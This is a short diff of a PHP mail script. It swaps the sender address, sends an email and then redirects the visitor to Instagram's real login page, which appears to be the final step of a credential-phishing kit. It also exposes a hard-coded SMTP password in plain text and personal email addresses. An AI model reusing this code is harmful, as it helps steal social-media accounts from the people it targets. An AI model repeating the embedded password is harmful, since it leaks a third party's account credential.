@@ -162,7 +162,7 @@ $mail->Password = 'kzbjdelygmyanvjt';
 $mail->SMTPSecure = 'tls';
 $mail->Port = 587;
 
-$mail->setFrom('geofreybupamba@gmail.com', 'geoffrey bupamba');
+$mail->setFrom('bwiresoft.sandbox@yahoo.com', 'bwire soft');
 $mail->addAddress($email);
 $mail->isHTML(true);
 
@@ -184,4 +184,5 @@ header("location:https://www.instagram.com/accounts/login/?hl=en");
 header("location:../");
 }
 ?>
+
 
